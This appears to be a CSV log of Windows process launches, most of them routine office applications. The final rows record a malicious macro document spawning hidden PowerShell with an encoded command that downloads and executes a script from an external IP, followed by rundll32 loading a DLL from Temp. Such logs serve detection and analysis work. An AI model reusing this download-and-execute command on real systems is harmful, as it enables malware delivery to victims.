2026-03-06T03:53:00Z,SRV-APP-02,r.singh,excel.exe,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,excel.exe,explorer.exe
2026-03-06T03:58:00Z,WKS-CHI-009,l.garcia,teams.exe,C:\Users\l.garcia\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-06T04:03:00Z,SRV-APP-02,j.patel,teams.exe,C:\Users\j.patel\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-06T04:04:00Z,SRV-FILE-01,j.patel,teams.exe,C:\Users\j.patel\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-06T04:09:00Z,WKS-BLR-022,a.kowalski,teams.exe,C:\Users\a.kowalski\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-06T04:14:00Z,SRV-APP-02,l.garcia,onedrive.exe,C:\Users\l.garcia\AppData\Local\Microsoft\OneDrive\OneDrive.exe,onedrive.exe,explorer.exe
2026-03-06T04:17:00Z,WKS-BLR-014,m.owusu,excel.exe,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,excel.exe,explorer.exe
2026-03-06T04:19:00Z,SRV-FILE-01,m.owusu,explorer.exe,C:\Windows\explorer.exe,explorer.exe,explorer.exe
2026-03-06T04:20:00Z,WKS-BLR-014,a.kowalski,teams.exe,C:\Users\a.kowalski\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-06T04:25:00Z,SRV-FILE-01,m.owusu,chrome.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,explorer.exe
2026-03-06T04:27:00Z,WKS-BLR-022,r.singh,excel.exe,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,excel.exe,explorer.exe
2026-03-06T04:30:00Z,SRV-APP-02,l.garcia,teams.exe,C:\Users\l.garcia\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-06T04:33:00Z,WKS-CHI-009,r.singh,teams.exe,C:\Users\r.singh\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-06T04:35:00Z,SRV-FILE-01,m.owusu,chrome.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,explorer.exe
2026-03-06T04:37:00Z,SRV-APP-02,a.kowalski,explorer.exe,C:\Windows\explorer.exe,explorer.exe,explorer.exe
2026-03-06T04:38:00Z,SRV-FILE-01,l.garcia,onedrive.exe,C:\Users\l.garcia\AppData\Local\Microsoft\OneDrive\OneDrive.exe,onedrive.exe,explorer.exe
2026-03-06T04:43:00Z,WKS-BLR-022,l.garcia,chrome.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,explorer.exe
2026-03-06T04:49:00Z,WKS-CHI-009,l.garcia,teams.exe,C:\Users\l.garcia\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-06T04:51:00Z,SRV-APP-02,m.owusu,outlook.exe,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,outlook.exe,explorer.exe
2026-03-06T04:56:00Z,WKS-LON-031,m.owusu,outlook.exe,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,outlook.exe,explorer.exe
2026-03-06T04:59:00Z,WKS-BLR-014,l.garcia,teams.exe,C:\Users\l.garcia\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-06T05:04:00Z,SRV-APP-02,m.owusu,explorer.exe,C:\Windows\explorer.exe,explorer.exe,explorer.exe
2026-03-06T05:05:00Z,WKS-BLR-022,l.garcia,explorer.exe,C:\Windows\explorer.exe,explorer.exe,explorer.exe
2026-03-06T05:10:00Z,SRV-APP-02,s.nguyen,explorer.exe,C:\Windows\explorer.exe,explorer.exe,explorer.exe
2026-03-06T05:13:00Z,WKS-BLR-022,s.nguyen,outlook.exe,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,outlook.exe,explorer.exe
2026-03-06T05:18:00Z,WKS-BLR-014,l.garcia,outlook.exe,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,outlook.exe,explorer.exe
2026-03-06T05:23:00Z,WKS-LON-031,m.owusu,onedrive.exe,C:\Users\m.owusu\AppData\Local\Microsoft\OneDrive\OneDrive.exe,onedrive.exe,explorer.exe
2026-03-06T05:28:00Z,WKS-LON-031,a.kowalski,explorer.exe,C:\Windows\explorer.exe,explorer.exe,explorer.exe
2026-03-06T05:34:00Z,WKS-LON-031,j.patel,explorer.exe,C:\Windows\explorer.exe,explorer.exe,explorer.exe
2026-03-06T05:35:00Z,WKS-LON-031,a.kowalski,explorer.exe,C:\Windows\explorer.exe,explorer.exe,explorer.exe
2026-03-06T05:40:00Z,WKS-CHI-009,s.nguyen,chrome.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,explorer.exe
2026-03-06T05:43:00Z,WKS-BLR-014,r.singh,onedrive.exe,C:\Users\r.singh\AppData\Local\Microsoft\OneDrive\OneDrive.exe,onedrive.exe,explorer.exe
2026-03-06T05:44:00Z,SRV-FILE-01,j.patel,teams.exe,C:\Users\j.patel\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-06T05:50:00Z,WKS-BLR-022,r.singh,chrome.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,explorer.exe
2026-03-06T05:55:00Z,WKS-BLR-022,s.nguyen,explorer.exe,C:\Windows\explorer.exe,explorer.exe,explorer.exe
2026-03-06T05:59:00Z,WKS-BLR-014,m.owusu,teams.exe,C:\Users\m.owusu\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-06T06:03:00Z,SRV-FILE-01,l.garcia,chrome.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,explorer.exe
2026-03-06T06:09:00Z,WKS-BLR-014,s.nguyen,teams.exe,C:\Users\s.nguyen\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-06T06:14:00Z,WKS-BLR-014,j.patel,excel.exe,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,excel.exe,explorer.exe
2026-03-06T06:16:00Z,SRV-APP-02,l.garcia,onedrive.exe,C:\Users\l.garcia\AppData\Local\Microsoft\OneDrive\OneDrive.exe,onedrive.exe,explorer.exe
2026-03-06T06:21:00Z,WKS-BLR-022,s.nguyen,explorer.exe,C:\Windows\explorer.exe,explorer.exe,explorer.exe
2026-03-06T06:25:00Z,WKS-CHI-009,j.patel,outlook.exe,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,outlook.exe,explorer.exe
2026-03-06T06:26:00Z,WKS-CHI-009,l.garcia,teams.exe,C:\Users\l.garcia\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-06T06:28:00Z,SRV-APP-02,j.patel,outlook.exe,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,outlook.exe,explorer.exe
2026-03-06T06:32:00Z,WKS-BLR-022,a.kowalski,chrome.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,explorer.exe
2026-03-06T06:36:00Z,WKS-BLR-022,a.kowalski,onedrive.exe,C:\Users\a.kowalski\AppData\Local\Microsoft\OneDrive\OneDrive.exe,onedrive.exe,explorer.exe
2026-03-06T06:39:00Z,SRV-APP-02,l.garcia,explorer.exe,C:\Windows\explorer.exe,explorer.exe,explorer.exe
2026-03-06T06:44:00Z,WKS-CHI-009,r.singh,teams.exe,C:\Users\r.singh\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-06T06:48:00Z,WKS-BLR-022,r.singh,teams.exe,C:\Users\r.singh\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-06T06:50:00Z,WKS-LON-031,l.garcia,excel.exe,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,excel.exe,explorer.exe
2026-03-06T06:53:00Z,WKS-CHI-009,r.singh,excel.exe,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,excel.exe,explorer.exe
2026-03-06T06:56:00Z,WKS-BLR-014,a.kowalski,explorer.exe,C:\Windows\explorer.exe,explorer.exe,explorer.exe
2026-03-06T06:57:00Z,WKS-BLR-022,l.garcia,explorer.exe,C:\Windows\explorer.exe,explorer.exe,explorer.exe
2026-03-06T07:03:00Z,SRV-APP-02,j.patel,excel.exe,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,excel.exe,explorer.exe
2026-03-06T07:09:00Z,WKS-LON-031,a.kowalski,outlook.exe,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,outlook.exe,explorer.exe
2026-03-06T07:15:00Z,WKS-BLR-022,j.patel,excel.exe,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,excel.exe,explorer.exe
2026-03-06T07:20:00Z,SRV-FILE-01,l.garcia,excel.exe,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,excel.exe,explorer.exe
2026-03-06T07:21:00Z,WKS-BLR-022,s.nguyen,outlook.exe,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,outlook.exe,explorer.exe
2026-03-06T07:23:00Z,SRV-APP-02,r.singh,excel.exe,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,excel.exe,explorer.exe
2026-03-06T07:25:00Z,WKS-BLR-022,r.singh,teams.exe,C:\Users\r.singh\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-06T07:28:00Z,WKS-LON-031,r.singh,onedrive.exe,C:\Users\r.singh\AppData\Local\Microsoft\OneDrive\OneDrive.exe,onedrive.exe,explorer.exe
2026-03-06T07:34:00Z,WKS-CHI-009,r.singh,outlook.exe,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,outlook.exe,explorer.exe
2026-03-06T07:39:00Z,SRV-APP-02,r.singh,excel.exe,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,excel.exe,explorer.exe
2026-03-06T07:40:00Z,WKS-BLR-022,l.garcia,explorer.exe,C:\Windows\explorer.exe,explorer.exe,explorer.exe
2026-03-06T07:44:00Z,SRV-FILE-01,s.nguyen,outlook.exe,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,outlook.exe,explorer.exe
2026-03-06T07:47:00Z,SRV-APP-02,m.owusu,teams.exe,C:\Users\m.owusu\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-06T07:50:00Z,WKS-CHI-009,j.patel,teams.exe,C:\Users\j.patel\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-06T07:54:00Z,WKS-CHI-009,l.garcia,chrome.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,explorer.exe
2026-03-06T07:59:00Z,WKS-LON-031,r.singh,onedrive.exe,C:\Users\r.singh\AppData\Local\Microsoft\OneDrive\OneDrive.exe,onedrive.exe,explorer.exe
2026-03-06T08:01:00Z,WKS-BLR-014,j.patel,explorer.exe,C:\Windows\explorer.exe,explorer.exe,explorer.exe
2026-03-06T08:06:00Z,WKS-BLR-014,a.kowalski,onedrive.exe,C:\Users\a.kowalski\AppData\Local\Microsoft\OneDrive\OneDrive.exe,onedrive.exe,explorer.exe
2026-03-06T08:09:00Z,SRV-APP-02,m.owusu,excel.exe,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,excel.exe,explorer.exe
2026-03-06T08:10:00Z,SRV-FILE-01,j.patel,excel.exe,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,excel.exe,explorer.exe
2026-03-06T08:12:00Z,WKS-BLR-022,m.owusu,onedrive.exe,C:\Users\m.owusu\AppData\Local\Microsoft\OneDrive\OneDrive.exe,onedrive.exe,explorer.exe
2026-03-06T08:16:00Z,WKS-CHI-009,j.patel,teams.exe,C:\Users\j.patel\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-06T08:22:00Z,WKS-CHI-009,a.kowalski,excel.exe,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,excel.exe,explorer.exe
2026-03-06T08:27:00Z,SRV-APP-02,a.kowalski,onedrive.exe,C:\Users\a.kowalski\AppData\Local\Microsoft\OneDrive\OneDrive.exe,onedrive.exe,explorer.exe
2026-03-06T08:31:00Z,WKS-BLR-014,s.nguyen,explorer.exe,C:\Windows\explorer.exe,explorer.exe,explorer.exe
2026-03-06T08:32:00Z,WKS-LON-031,a.kowalski,teams.exe,C:\Users\a.kowalski\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-06T08:34:00Z,WKS-BLR-022,r.singh,excel.exe,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,excel.exe,explorer.exe
2026-03-06T08:37:00Z,WKS-BLR-014,l.garcia,explorer.exe,C:\Windows\explorer.exe,explorer.exe,explorer.exe
2026-03-06T08:38:00Z,WKS-LON-031,r.singh,explorer.exe,C:\Windows\explorer.exe,explorer.exe,explorer.exe
2026-03-06T08:44:00Z,SRV-APP-02,s.nguyen,outlook.exe,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,outlook.exe,explorer.exe
2026-03-06T08:49:00Z,WKS-BLR-022,l.garcia,teams.exe,C:\Users\l.garcia\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-06T08:51:00Z,WKS-CHI-009,r.singh,teams.exe,C:\Users\r.singh\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-06T08:57:00Z,WKS-BLR-022,j.patel,chrome.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,explorer.exe
2026-03-06T09:00:00Z,WKS-CHI-009,l.garcia,teams.exe,C:\Users\l.garcia\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-06T09:04:00Z,WKS-LON-031,a.kowalski,chrome.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,explorer.exe
2026-03-06T09:05:00Z,SRV-APP-02,l.garcia,onedrive.exe,C:\Users\l.garcia\AppData\Local\Microsoft\OneDrive\OneDrive.exe,onedrive.exe,explorer.exe
2026-03-06T09:11:00Z,WKS-BLR-014,r.singh,chrome.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,explorer.exe
2026-03-06T09:13:00Z,SRV-FILE-01,s.nguyen,chrome.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,explorer.exe
2026-03-06T09:14:00Z,WKS-BLR-014,r.singh,teams.exe,C:\Users\r.singh\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-06T09:18:00Z,SRV-APP-02,j.patel,chrome.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,explorer.exe
2026-03-06T09:23:00Z,WKS-LON-031,l.garcia,onedrive.exe,C:\Users\l.garcia\AppData\Local\Microsoft\OneDrive\OneDrive.exe,onedrive.exe,explorer.exe
2026-03-06T09:26:00Z,WKS-BLR-022,r.singh,outlook.exe,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,outlook.exe,explorer.exe
2026-03-06T09:29:00Z,SRV-APP-02,r.singh,teams.exe,C:\Users\r.singh\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-06T09:34:00Z,WKS-BLR-022,j.patel,outlook.exe,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,outlook.exe,explorer.exe
2026-03-06T09:39:00Z,WKS-CHI-009,l.garcia,outlook.exe,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,outlook.exe,explorer.exe
2026-03-06T09:42:00Z,SRV-FILE-01,m.owusu,chrome.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,explorer.exe
2026-03-06T09:44:00Z,SRV-FILE-01,j.patel,teams.exe,C:\Users\j.patel\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-06T09:50:00Z,WKS-BLR-014,m.owusu,outlook.exe,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,outlook.exe,explorer.exe
2026-03-06T09:55:00Z,WKS-BLR-014,a.kowalski,excel.exe,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,excel.exe,explorer.exe
2026-03-06T10:00:00Z,WKS-BLR-014,m.owusu,explorer.exe,C:\Windows\explorer.exe,explorer.exe,explorer.exe
2026-03-06T10:01:00Z,WKS-LON-031,s.nguyen,teams.exe,C:\Users\s.nguyen\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-06T10:07:00Z,WKS-BLR-022,m.owusu,onedrive.exe,C:\Users\m.owusu\AppData\Local\Microsoft\OneDrive\OneDrive.exe,onedrive.exe,explorer.exe
2026-03-06T10:08:00Z,WKS-CHI-009,a.kowalski,chrome.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,explorer.exe
2026-03-06T10:12:00Z,WKS-BLR-014,s.nguyen,explorer.exe,C:\Windows\explorer.exe,explorer.exe,explorer.exe
2026-03-06T10:16:00Z,SRV-FILE-01,s.nguyen,chrome.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,explorer.exe
2026-03-06T10:22:00Z,SRV-FILE-01,a.kowalski,explorer.exe,C:\Windows\explorer.exe,explorer.exe,explorer.exe
2026-03-06T10:25:00Z,WKS-LON-031,r.singh,outlook.exe,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,outlook.exe,explorer.exe
2026-03-06T10:30:00Z,WKS-BLR-014,s.nguyen,explorer.exe,C:\Windows\explorer.exe,explorer.exe,explorer.exe
2026-03-06T10:31:00Z,WKS-BLR-014,s.nguyen,chrome.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,explorer.exe
2026-03-06T10:36:00Z,WKS-LON-031,a.kowalski,teams.exe,C:\Users\a.kowalski\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-06T10:41:00Z,SRV-FILE-01,r.singh,excel.exe,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,excel.exe,explorer.exe
2026-03-06T10:47:00Z,WKS-LON-031,s.nguyen,teams.exe,C:\Users\s.nguyen\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-06T10:51:00Z,SRV-APP-02,m.owusu,chrome.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,explorer.exe
2026-03-06T10:55:00Z,WKS-BLR-014,j.patel,explorer.exe,C:\Windows\explorer.exe,explorer.exe,explorer.exe
2026-03-06T10:56:00Z,WKS-CHI-009,l.garcia,chrome.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,explorer.exe
2026-03-06T10:58:00Z,WKS-CHI-009,m.owusu,onedrive.exe,C:\Users\m.owusu\AppData\Local\Microsoft\OneDrive\OneDrive.exe,onedrive.exe,explorer.exe
2026-03-06T10:59:00Z,WKS-BLR-022,a.kowalski,outlook.exe,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,outlook.exe,explorer.exe
2026-03-06T11:00:00Z,WKS-CHI-009,a.kowalski,chrome.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,explorer.exe
2026-03-06T11:05:00Z,WKS-BLR-022,s.nguyen,teams.exe,C:\Users\s.nguyen\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-06T11:11:00Z,WKS-LON-031,s.nguyen,teams.exe,C:\Users\s.nguyen\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-06T11:12:00Z,SRV-APP-02,j.patel,onedrive.exe,C:\Users\j.patel\AppData\Local\Microsoft\OneDrive\OneDrive.exe,onedrive.exe,explorer.exe
2026-03-06T11:13:00Z,WKS-CHI-009,j.patel,excel.exe,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,excel.exe,explorer.exe
2026-03-06T11:17:00Z,WKS-CHI-009,r.singh,chrome.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,explorer.exe
2026-03-06T11:19:00Z,SRV-APP-02,s.nguyen,excel.exe,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,excel.exe,explorer.exe
2026-03-06T11:21:00Z,SRV-FILE-01,a.kowalski,chrome.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,explorer.exe
2026-03-06T11:27:00Z,WKS-BLR-022,j.patel,chrome.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,explorer.exe
2026-03-06T11:28:00Z,WKS-BLR-014,r.singh,outlook.exe,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,outlook.exe,explorer.exe
2026-03-06T11:29:00Z,SRV-APP-02,r.singh,explorer.exe,C:\Windows\explorer.exe,explorer.exe,explorer.exe
2026-03-06T11:30:00Z,SRV-FILE-01,l.garcia,teams.exe,C:\Users\l.garcia\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-06T11:32:00Z,SRV-APP-02,a.kowalski,outlook.exe,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,outlook.exe,explorer.exe
2026-03-06T11:37:00Z,SRV-FILE-01,s.nguyen,chrome.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,explorer.exe
2026-03-06T11:41:00Z,SRV-APP-02,l.garcia,teams.exe,C:\Users\l.garcia\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-06T11:44:00Z,WKS-LON-031,s.nguyen,excel.exe,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,excel.exe,explorer.exe
2026-03-06T17:41:00Z,WKS-LON-031,a.kowalski,winword.exe,C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,"""WINWORD.EXE"" /n ""C:\Users\a.kowalski\Downloads\Invoice_44921.docm""",explorer.exe
2026-03-06T17:41:08Z,WKS-LON-031,a.kowalski,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANAA3AC8AcwAyAC4AcABzADEAJwApAA==,winword.exe
2026-03-06T17:41:12Z,WKS-LON-031,a.kowalski,rundll32.exe,C:\Windows\System32\rundll32.exe,"rundll32.exe C:\Users\a.kowalski\AppData\Local\Temp\upd_cache.dll,Start",powershell.exe
